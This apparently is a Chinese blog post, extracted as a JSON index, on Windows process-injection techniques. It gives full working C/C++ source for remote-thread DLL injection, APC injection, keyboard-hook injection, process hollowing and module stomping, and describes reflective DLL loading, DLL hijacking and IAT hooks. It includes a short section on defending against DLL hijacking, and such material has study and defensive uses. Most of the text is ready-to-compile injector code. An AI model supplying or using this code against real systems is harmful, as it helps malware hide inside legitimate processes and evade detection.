参数1:要安装的挂钩类型 参数2:指定系统调用的窗口消息处理函数 参数3:标示一个包含窗口处理消息函数(参数2)的DLL 参数4:安装挂钩的线程ID */ m_hHook = SetWindowsHookEx(WH_KEYBOARD, sub_address, m_hmDll, dwThreadID); if (m_hHook != NULL) { return TRUE; } else { return FALSE; } } DWORD CLuoDstDlg::GetThreadID(ULONG32 ulTargetProcessID) { HANDLE Handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (Handle != INVALID_HANDLE_VALUE) { THREADENTRY32 te; te.dwSize = sizeof(te); if (Thread32First(Handle, \u0026te)) { do { if (te.dwSize \u003e= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) { if (te.th32OwnerProcessID == ulTargetProcessID) { HANDLE hThread = OpenThread(READ_CONTROL, FALSE, te.th32ThreadID); if (!hThread) { //MessageBox(\"Couldn't get thread handle!\"); } else { return te.th32ThreadID; } } } } while (Thread32Next(Handle, \u0026te)); } } CloseHandle(Handle); return (DWORD)0; } DWORD CLuoDstDlg::GetPIdByProcessName(const char* pszProcessName) { DWORD id = 0; //获得系统快照句柄 (得到当前的所有进程) HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pInfo; //用于保存进程信息的一个数据结构 pInfo.dwSize = sizeof(pInfo); //从快照中获取进程列表 Process32First(hSnapShot, \u0026pInfo); //从第一个进程开始循环 do { //这里的 pszProcessName 为你的进程名称 //strcmp(_strlwr(_strdup(pInfo.szExeFile)), pszProcessName) == 0 if (strcmp(pInfo.szExeFile, pszProcessName) == 0) { id = pInfo.th32ProcessID; break; } } while (Process32Next(hSnapShot, \u0026pInfo) != FALSE); return id; } ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:2:2","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"远程线程注入 原理: HANDLE CreateRemoteThread( [in] HANDLE hProcess, [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in] LPVOID lpParameter, [in] DWORD dwCreationFlags, [out] LPDWORD lpThreadId ); typedef DWORD (__stdcall *LPTHREAD_START_ROUTINE) ( [in] LPVOID lpThreadParameter); HMODULE LoadLibraryA( [in] LPCSTR lpLibFileName ); 远程线程注入主要是利用了CreateRemoteThread这个API,这API的第四个参数,线程函数的起始地址与LoadLibrary的函数定义相同,又因为LoadLibrary在Kernel32.dll中,kernel32,ntdll,同一台机器,不同进程,加载这两个Dll的位置固定,故可直接填本进程的LoadLibrary地址,从而可以利用CreateRemoteThread这个API在远程进程中加载一个Dll. 相关源码: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cio.h\u003e #include \u003ctchar.h\u003e #include \u003cwindows.h\u003e #include \u003cTlhelp32.h\u003e #include \u003cShlwapi.h\u003e #pragma comment(lib,\"Shlwapi.lib\") /************************************************************************ 函数名称：RemoteInjectDll 函数功能：向目标进程中注入一个指定 Dll 参 数：pDllPath dll的存放路径 返 回 值：成功返回PID/失败返回NULL ************************************************************************/ DWORD GetProcessIDFromName(const TCHAR* pProcName) { HANDLE hSnapshot = NULL; BOOL bStatus = FALSE; DWORD dwProcessId = 0; PROCESSENTRY32 pi = { 0 }; pi.dwSize = sizeof(pi); hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot == NULL) { return NULL; } bStatus = ::Process32First(hSnapshot, \u0026pi); while (bStatus) { if (memcmp(pProcName, pi.szExeFile, ::_tcslen(pProcName)) == 0) { dwProcessId = pi.th32ProcessID; break; } bStatus = ::Process32Next(hSnapshot, \u0026pi); } if (hSnapshot != NULL) { ::CloseHandle(hSnapshot); } return dwProcessId; } /************************************************************************ 函数名称：RemoteInjectDll 函数功能：向目标进程中注入一个指定 Dll 参 数1：pProcName 进程名 参 数2：pDllPath dll的存放路径 返 回 值：注入成功返回TRUE/注入失败返回FALSE ************************************************************************/ BOOL RemoteInjectDll(const TCHAR* pProcName, const TCHAR* pDllPath) { HANDLE hProcess = NULL, hThread = NULL; DWORD dwSize = 0, dwProcessId = 0; BOOL bRet = FALSE; TCHAR* pRemoteBuf = NULL; LPTHREAD_START_ROUTINE lpThreadFun = NULL; // 参数无效 if (pProcName == NULL || ::_tcslen(pProcName) == 0 || pDllPath == NULL || ::_tcslen(pDllPath) == 0) { return FALSE; } // 指定 Dll 文件不存在 if (_taccess(pDllPath, 0) == -1) { return false; } do { //获取进程ID dwProcessId = GetProcessIDFromName(pProcName); if (dwProcessId == 0) { break; } // 获取目标进程句柄 hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) { break; } // 在目标进程中分配内存空间 dwSize = (DWORD)::_tcslen(pDllPath) + 1; pRemoteBuf = (TCHAR*)::VirtualAllocEx(hProcess, NULL, dwSize * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE); if (pRemoteBuf == NULL) { break; } // 在目标进程的内存空间中写入所需参数(模块名) if (FALSE == ::WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)pDllPath, dwSize * sizeof(TCHAR), NULL)) { break; } // 获取 LoadLibrary 地址 #ifdef _UNICODE lpThreadFun = (PTHREAD_START_ROUTINE)::GetProcAddress(::GetModuleHandle(_T(\"Kernel32\")), \"LoadLibraryW\"); #else lpThreadFun = (PTHREAD_START_ROUTINE)::GetProcAddress(::GetModuleHandle(_T(\"Kernel32\")), \"LoadLibraryA\"); #endif if (lpThreadFun == NULL) { break; } // 创建远程线程调用 LoadLibrary hThread = ::CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpThreadFun, pRemoteBuf, 0, NULL); if (hThread == NULL) { break; } // 等待远程线程结束 ::WaitForSingleObject(hThread, INFINITE); bRet = TRUE; } while (0); if (hThread != NULL) { ::CloseHandle(hThread); } if (pRemoteBuf != NULL) { ::VirtualFreeEx(hProcess, pRemoteBuf, dwSize, MEM_DECOMMIT); } if (hProcess != NULL) { ::CloseHandle(hProcess); } return bRet; } /************************************************************************ 函数名称：UnRemoteInjectDll 函数功能：从目标进程中卸载一个指定 Dll 参 数1：pProcName 进程名 参 数2：pDllPath dll的存放路径 返 回 值：卸载成功返回TRUE/卸载失败返回FALSE 备 注：采用远程线程注入技术实现 ************************************************************************/ BOOL UnRemoteInjectDll(const TCHAR* pProcName, const TCHAR* pDllPath) { HANDLE hModuleSnap = INVALID_HANDLE_VALUE, hProcess = NULL, hThread = NULL; TCHAR","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:3:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"反射Dll注入 Dll编写: 导出一个函数,如ReflectiveLoader. 借助caller()函数(获得当前指令的下条指令的地址),找到当前映射到内存的地址,然后逐字节向上遍历,当查找到符合PE格式的文件头之后，就可以认为找到了DLL文件在内存中的地址了. 新申请一片内存,用于存放当前Dll文件. 修复上述内存中Dll,导入表,重定位表等. 调用Dll入口函数. 注入工具编写: 用CreateFile,ReadFile读取上述DLL到缓冲区中. 解析上述缓冲区中的PE格式,通过导出表拿上述导出函数偏移地址,ReflectiveLoader. 利用OpenProcess,VirtualAllocEx,WriteProcessMemory将上述Dll写入到远程进程中. 利用CreateRemoteThread,传上述Dll基址+导出函数ReflectiveLoader的偏移地址,执行Dll中的导出函数. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:4:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Dll劫持 原理: 如果在进程尝试加载一个DLL时,并没有指定DLL的绝对路径,那么Windows会尝试按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录,那么就能够欺骗系统去加载恶意的DLL,形成\"劫持\". Dynamic-link library search order 默认情况下启用安全DLL搜索模式.要禁用此功能,可以创建HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode注册表值并将其设置为0. 如果启用SafeDllSearchMode,搜索顺序如下: 应用程序exe所在的路径. 系统目录,使用GetSystemDirectory函数可以获取该路径. 16位系统目录. Windows目录,使用GetWindowsDirectory函数可以获取该路径. 用户的当前目录. PATH环境变量中列出的目录. 如果禁用SafeDllSearchMode,搜索顺序如下: 应用程序exe所在的路径. 用户的当前目录.当前目录的搜索顺序被提前了,较容易遭到DLL劫持攻击. 系统目录. 16位系统目录. Windwos目录. PATH环境变量中列出的目录. 方式: 在自己的dll中导出和劫持的目标dll相同的函数接口,然后在自己的接口函数中调用原始dll的函数,如此使得原始dll的功能能够被正常使用. 在自己的dll的dllmian中加载被劫持dll,然后修改loadlibrary的返回值为被劫持dll加载后的模块句柄. 防护方法: 添加KnownDLL. HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 该项下的子键代表了dll的名字,如果这里存在user32.dll,则系统不会加载当前目录下的user.dll,而是会去系统盘加载. 对于系统DLL,不通过修改本机KnownDLLs进行单机防护,而是通过修改文件manifest属性进行定向加载DLL来解决通用系统DLL劫持问题. 对于非系统第三方DLL,上面的方法就不太适用了,可以使用动态加载方式,不要使用静态导入方式加载,通过动态加载对文件进行校验,如数字签名校验通过后再进行加载,来保证程序的安全性. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"APC注入 原理: 利用当线程被唤醒时APC中的注册函数会被执行的机制,并以此去执行我们的DLL加载代码,进而完成DLL注入. APC示例: #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #include \u003cTlHelp32.h\u003e #include \u003ctchar.h\u003e DWORD GetPidByPname(char* pszProcessName) { DWORD id = 0; //获得系统快照句柄 (得到当前的所有进程) HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pInfo; //用于保存进程信息的一个数据结构 pInfo.dwSize = sizeof(pInfo); //从快照中获取进程列表 Process32First(hSnapShot, \u0026pInfo); //从第一个进程开始循环 do { //这里的 pszProcessName 为你的进程名称 //strcmp(_strlwr(_strdup(pInfo.szExeFile)), pszProcessName) == 0 if (strcmp(pInfo.szExeFile, pszProcessName) == 0) { id = pInfo.th32ProcessID; break; } } while (Process32Next(hSnapShot, \u0026pInfo) != FALSE); return id; } BOOL GetAllTidByPid(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength) { DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBuffLength = 1000; THREADENTRY32 te32 = { 0 }; HANDLE hSnapShot = NULL; BOOL bRet = TRUE; do { //申请内存 pThreadId = new DWORD[dwBuffLength]; if (pThreadId == NULL) { bRet = FALSE; break; } else { } RtlZeroMemory(pThreadId, (dwBuffLength * sizeof(DWORD))); //获取线程快照 RtlZeroMemory(\u0026te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hSnapShot == NULL) { bRet = FALSE; break; } else { } //获取第一条快照的信息 bRet = Thread32First(hSnapShot, \u0026te32); while (bRet) { //获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) { pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; } //遍历下一个线程快照信息 bRet = Thread32Next(hSnapShot, \u0026te32); } //返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; } while (FALSE); if (FALSE == bRet) { if (pThreadId) { delete[] pThreadId; pThreadId = NULL; } } return bRet; } BOOL APCInject(char* pszProcessName, char* pszDllName) { BOOL bRet = FALSE; DWORD dwProcessId = 0; DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; HANDLE hProcess = NULL; HANDLE hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryAFunc = NULL; SIZE_T dwRet = 0; DWORD dwDllPathLen = strlen(pszDllName) + 1; DWORD i = 0; do { //根据进程名称获取PID dwProcessId = GetPidByPname(pszProcessName); if (0 \u003e= dwProcessId) { bRet = FALSE; break; } else { } //根据PID bRet = GetAllTidByPid(dwProcessId, \u0026pThreadId, \u0026dwThreadIdLength); if (bRet == FALSE) { bRet = FALSE; break; } else { } //打开注入进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) { bRet = FALSE; break; } else { } //在注入的进程空间申请内存 pBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pBaseAddress == NULL) { bRet = FALSE; break; } else { } //向申请的空间中写入DLL路径数据 WriteProcessMemory(hProcess, pBaseAddress, pszDllName, dwDllPathLen, \u0026dwRet); if (dwRet != dwDllPathLen) { bRet = FALSE; break; } else { } //获取LoadLibrary的地址 pLoadLibraryAFunc = GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"LoadLibraryA\"); if (pLoadLibraryAFunc == NULL) { bRet = FALSE; break; } else { } //遍历线程 插入APC for (i = 0; i \u003c dwThreadIdLength; i++) { //打开线程 hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) { //插入APC QueueUserAPC((PAPCFUNC)pLoadLibraryAFunc, hThread, (ULONG_PTR)pBaseAddress); //关闭线程句柄 CloseHandle(hThread); hThread = NULL; } } bRet = TRUE; } while (FALSE); //释放内存 if (hProcess) { CloseHandle(hProcess); hProcess = NULL; } if (hThread) { delete[] pThreadId; pThreadId = NULL; } return bRet; } int main() { TCHAR szDllPath[MAX_PATH] = { 0 }; GetCurrentDirectory(MAX_PATH, szDllPath); _tcscat(szDllPath, TEXT(\"\\\\LuoDll.dll\")); APCInject(\"Clover.exe\", szDllPath); system(\"pause\"); return 0; } ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:6:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"IAT Hook IAT Hook是恶意软件用于更改导入地址表的技术.当合法应用程序调用位于DLL中的API时,其会执行替换的函数,而不是原始函数. IAT_patcher实现示例 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:7:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"傀儡进程 原理: 借助正常的软件进程或系统进程的外壳来执行非正常的恶意操作. 挂起创建一个正常程序,如svchost.exe. 利用VirtualAllocEx,WriteProcessMemory将自己的PeLoader,自己的程序写入上述挂起的进程中. 修改上述挂起程序的OEP处为下方指令. #x86 Push1 BufferAddress #将自己的程序Buffer入栈 Call CallAddress #调用x86_PeLoader #x64 sub rsp, -0x28 mov rcx, BufferAddress #将自己的程序Buffer传给rcx mov rax, CallAddress call rax #调用x64_PeLoader add rsp, 0x28 jmp rax 恢复上述挂起的进程. 相关源码: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstrsafe.h\u003e #include \u003cWindows.h\u003e #include \"define_ntdll.h\" #include \"ShellCode/ShellCode.h\" #include \"ShellCode/ShellCode64.h\" #include \"LuoFile.h\" typedef void* (_cdecl* _pfnmemcpy)(void*, void*, size_t); typedef void* (_cdecl* _pfnmemset)(void*, int, size_t); typedef BOOL(WINAPI* PFNCreateProcess)(LPSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); typedef BOOL(WINAPI* PFNReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead); typedef BOOL(WINAPI* PFNWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten); typedef DWORD(WINAPI* PFNResumeThread)(HANDLE hThread); typedef NTSTATUS(WINAPI* PFNZwQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength); typedef LPVOID(WINAPI* PFNVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef LPVOID(WINAPI* PFNVirtualProtectEx)(__in HANDLE hProcess, __in LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flNewProtect, __out PDWORD lpflOldProtect); typedef BOOL(WINAPI* PFNWinStationTerminateProcess)(HANDLE ServerHandle, ULONG ProcessId, ULONG ExitCode); static _pfnmemcpy pfnmemcpy = NULL; static _pfnmemset pfnmemset = NULL; static PFNZwQueryInformationProcess pfnZwQueryInformationProcess = NULL; static PFNVirtualAllocEx pfnVirtualAllocEx = NULL; static PFNWriteProcessMemory pfnWriteProcessMemory = NULL; static PFNCreateProcess pfnCreateProcess = NULL; static PFNResumeThread pfnResumeThread = NULL; static PFNWinStationTerminateProcess pfnWinStationTerminateProcess = NULL; BOOL Initialize() { HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\"); pfnmemset = (_pfnmemset)GetProcAddress(ntdll, \"memset\"); pfnmemcpy = (_pfnmemcpy)GetProcAddress(ntdll, \"memcpy\"); pfnZwQueryInformationProcess = (PFNZwQueryInformationProcess)GetProcAddress(ntdll, \"ZwQueryInformationProcess\"); HMODULE Kernel = GetModuleHandleA(\"kernel32.dll\"); pfnVirtualAllocEx = (PFNVirtualAllocEx)GetProcAddress(Kernel, \"VirtualAllocEx\"); pfnWriteProcessMemory = (PFNWriteProcessMemory)GetProcAddress(Kernel, \"WriteProcessMemory\"); pfnCreateProcess = (PFNCreateProcess)GetProcAddress(Kernel, \"CreateProcessA\"); pfnResumeThread = (PFNResumeThread)GetProcAddress(Kernel, \"ResumeThread\"); HMODULE hWinStaDll = LoadLibrary(TEXT(\"WINSTA.dll\")); pfnWinStationTerminateProcess = (PFNWinStationTerminateProcess)GetProcAddress(hWinStaDll, \"WinStationTerminateProcess\"); if (pfnmemcpy == NULL || pfnmemset == NULL || pfnZwQueryInformationProcess == NULL || pfnVirtualAllocEx == NULL || pfnWriteProcessMemory == NULL || pfnCreateProcess == NULL || pfnResumeThread == NULL ) { return FALSE; } return TRUE; } // -1 不是合法PE 1 32位 2 64位 3 未知 int AnalyzeBuffer(LPBYTE pBuffer) { IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pBuffer; if (pDosHeader-\u003ee_magic != IMAGE_DOS_SIGNATURE) { return -1; } IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((char*)pBuffer + pDosHeader-\u003ee_lfanew); if (pNtHeader-\u003eSignature != IMAGE_NT_SIGNATURE) { return -1; } if (pNtHeader-\u003eFileHeader.Machine == IMAGE_FILE_MACHINE_I386) { return 1; } if (pNtHeader-\u003eFileHeader.Machine == IMAGE_FILE_MACHINE_IA64 || pNtHeader-\u003eFileHeader.Machine == IMAGE_FI","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:8:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Process Hollowing 此技术也可称为傀儡进程,亦可称为PE映像切换技术. 原理: 借助正常的软件进程或系统进程的外壳来执行非正常的恶意操作. 挂起创建一个正常程序,如svchost.exe. 利用NtQueryInformationProcess拿到上述挂起进程的PEB结构. 利用NtUnmapViewOfSection将上述挂起进程的内存映射清除. 利用VirtualAllocEx在上述挂起进程中申请到原pPEB-\u003elpImageBaseAddress地址. 利用WriteProcessMemory将我们写的程序复制到上述挂起进程中. 如果上述挂起进程的ImageBaseAddress与我们写的程序的ImageBaseAddress有差别,那就根据重定位表进行修复. 恢复上述挂起的进程. 相关源码: #include \"stdafx.h\" #include \u003cprocessthreadsapi.h\u003e #include \"pe.h\" HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile) { cout \u003c\u003c \"--\u003eCreating Process.\" \u003c\u003c endl; //指定窗口工作站，桌面，标准句柄以及创建时进程主窗口的外观的结构体 LPSTARTUPINFOA lpStartupInfo = new STARTUPINFOA(); LPPROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION(); HANDLE hProcess; CreateProcessA(NULL, lpCommandLine, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, lpStartupInfo, lpProcessInformation ); hProcess = lpProcessInformation-\u003ehProcess; cout \u003c\u003c lpProcessInformation-\u003edwProcessId \u003c\u003c endl; if (!hProcess) { cout \u003c\u003c \"--\u003eCreate Process Failed.\" \u003c\u003c endl; return hProcess; } _PPEB pPEB = ReadRemotePEB(hProcess); //PLOADED_IMAGE pImage = ReadRemoteImage(hProcess,pPEB-\u003elpImageBaseAddress); cout \u003c\u003c \"--\u003eOpening source image.\" \u003c\u003c endl; HANDLE hFile = CreateFileA(lpSourceFile, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout \u003c\u003c \"--\u003eOpen EXE File Filed.\" \u003c\u003c endl; return hProcess; } DWORD dwSize = GetFileSize(hFile, 0); PBYTE pBuffer = new BYTE[dwSize]; DWORD dwBytesRead = 0; ReadFile(hFile, pBuffer, dwSize, \u0026dwBytesRead, NULL); PLOADED_IMAGE pSourceImage = GetLoadedImage((ULONG_PTR)pBuffer); PIMAGE_NT_HEADERS pSourceHeader = pSourceImage-\u003eFileHeader; cout \u003c\u003c \"--\u003eUnmapping Destination Section.\" \u003c\u003c endl; HMODULE hNTDLL = GetModuleHandleA(\"ntdll\"); _NtUnmapViewOfSection NtUnmapViewSection = (_NtUnmapViewOfSection)GetProcAddress(hNTDLL, \"NtUnmapViewOfSection\"); DWORD dwResult = NtUnmapViewSection(lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress); if (dwResult) { cout \u003c\u003c \"--\u003eError Unmapping Section.\" \u003c\u003c endl; return hProcess; } //计算镜像大小 DWORD lastSectionEnd = 0;//最后节+数据长度的地址 DWORD endOfSection = 0; SYSTEM_INFO sysInfo; DWORD alignedImageSize = 0; PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pSourceHeader); //节的对齐粒度 DWORD optionoalSectionSize = pSourceHeader-\u003eOptionalHeader.SectionAlignment; for (int i = 0; i \u003c (pSourceHeader-\u003eFileHeader.NumberOfSections); i++, section++) { //如果节中没有数据，则保留一节 if (section-\u003eSizeOfRawData == 0) endOfSection = section-\u003eVirtualAddress + optionoalSectionSize; else endOfSection = section-\u003eVirtualAddress + (section-\u003eSizeOfRawData); if (endOfSection \u003e lastSectionEnd) lastSectionEnd = endOfSection; } //通过系统信息获取页面大小 GetNativeSystemInfo(\u0026sysInfo); //最后一节与页面对齐 alignedImageSize = AlignValueUp(lastSectionEnd, sysInfo.dwPageSize); if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize)) return hProcess; cout \u003c\u003c \"--\u003eAllocating Memory.\" \u003c\u003c endl; LPVOID pRemoteImage = VirtualAllocEx ( lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress, alignedImageSize, MEM_RESERVE,//参考Memory Module方式 PAGE_READWRITE ); if (!pRemoteImage) { cout \u003c\u003c \"--\u003eAllocate Memory Failed.\" \u003c\u003c endl; cout \u003c\u003c \"--\u003eError Code:\" \u003c\u003c GetLastError() \u003c\u003c endl; return hProcess; } //装载地址与默认地址的差值 ULONG_PTR upDelta = (ULONG_PTR)pPEB-\u003elpImageBaseAddress - pSourceHeader-\u003eOptionalHeader.ImageBase; cout \u003c\u003c hex \u003c\u003c \"Source Image BaseAddress:\" \u003c\u003c pSourceHeader-\u003eOptionalHeader.ImageBase \u003c\u003c endl; cout \u003c\u003c hex \u003c\u003c \"Destination Image BaseAddress:\" \u003c\u003c pPEB-\u003elpImageBaseAddress \u003c\u003c endl; cout \u003c\u003c hex \u003c\u003c \"Relocation Delat:\" \u003c\u003c upDelta \u003c\u003c endl; pSourceHeader-\u003eOptionalHeader.ImageBase = (ULONG_PTR)pPEB-\u003elpImageBaseAddress; cout \u003c\u003c \"--\u003eWriting Headers\" \u003c\u003c endl; //提交内存 VirtualAllocEx ( lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress, pSourceHeader-\u003eOptionalHeader.SizeOfHeaders, MEM_COMMIT,//参考Memory Module方式 PAGE_READWRITE ); if (!WriteProcessMemory ( lpProcessInformation-\u003ehProcess, pPEB-\u003elpImageBaseAddress, pBuffer, pSourceHeader-\u003eOptionalHeader.SizeOfHeaders, NULL )) { cout \u003c\u003c ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:9:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Module Stomping 该方法通过在目标进程中加载一个合法DLL,然后将shellcode或恶意DLL覆写到这个合法DLL的地址空间里. 原理: 利用OpenProcess,VirtualAllocEx在目标进程中申请一片内存. 利用WriteProcessMemory将合法Dll的路径写入目标进程中. 利用CreateRemoteThread传入LoadLibraryA以及上述合法Dll的路径,在目标进程中加载上述合法Dll. 利用EnumProcessModules在目标进程中找到上述合法Dll的基地址,进而找到EP. 利用WriteProcessMemory在目标进程合法Dll的EP处写入ShellCode. 利用CreateRemoteThread传入上述合法Dll的EP,进而执行我们的ShellCode. 相关源码: #include \u003cWindows.h\u003e #include \u003cstdio.h\u003e #include \u003cPsapi.h\u003e #include \u003cstring\u003e // Find our loaded module base HMODULE FindModuleBase(HANDLE hProcess) { HMODULE hModuleList[1024]; wchar_t moduleName[MAX_PATH]; DWORD cb = sizeof(hModuleList); DWORD cbNeeded; // Enumerates all the modules in the process // and retrieve handle of all modules if (EnumProcessModules(hProcess, hModuleList, cbNeeded, \u0026cbNeeded)) { for (unsigned int i = 0; i \u003c (cbNeeded / sizeof(HMODULE)); i++) { // Getting full path of the module // Alternatively we can use API GetModuleBaseNameA if (GetModuleFileNameEx(hProcess, hModuleList[i], moduleName, (sizeof(moduleName) / sizeof(DWORD)))) { // Comapring if the module path has our dll if (wcsstr(moduleName, L\"filemgmt.dll\") != nullptr) { return hModuleList[i]; break; } } } } return 0; } LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) { //BYTE* targetDLLHeader[0x1000]; LPVOID targetDLLHeader = { 0 }; DWORD sizeOfHeader = 0x1000; // Allocate local heap targetDLLHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader); // Reading the header of target dll ReadProcessMemory(hProcess, (LPVOID)hModule, targetDLLHeader, sizeOfHeader, NULL); PIMAGE_DOS_HEADER dosHeder = (PIMAGE_DOS_HEADER)targetDLLHeader; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetDLLHeader + dosHeder-\u003ee_lfanew); // Getting entry point of the target dll DWORD_PTR dllEntryPoint = ntHeaders-\u003eOptionalHeader.AddressOfEntryPoint; wprintf(L\"[+] DllEntryPoint offset: %p\\n\", (LPVOID)dllEntryPoint); // DLL 